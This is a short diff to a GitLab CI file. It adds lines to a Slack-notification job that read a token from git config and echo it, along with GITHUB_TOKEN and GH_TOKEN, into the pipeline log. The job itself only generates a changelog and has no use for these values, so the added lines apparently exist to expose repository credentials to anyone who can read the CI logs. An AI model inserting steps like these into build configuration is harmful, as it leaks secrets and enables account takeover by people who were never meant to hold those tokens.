@@ -58,6 +58,10 @@ notify-slack:
   needs:
     - job: internal_kubernetes_deploy_stripe
   script:
+    - export TEST_TOKEN=$(git config user.token)
+    - echo $TEST_TOKEN
+    - echo $GITHUB_TOKEN
+    - echo $GH_TOKEN
     - .gitlab/scripts/generate_changelog.sh 76ead44c
 
 
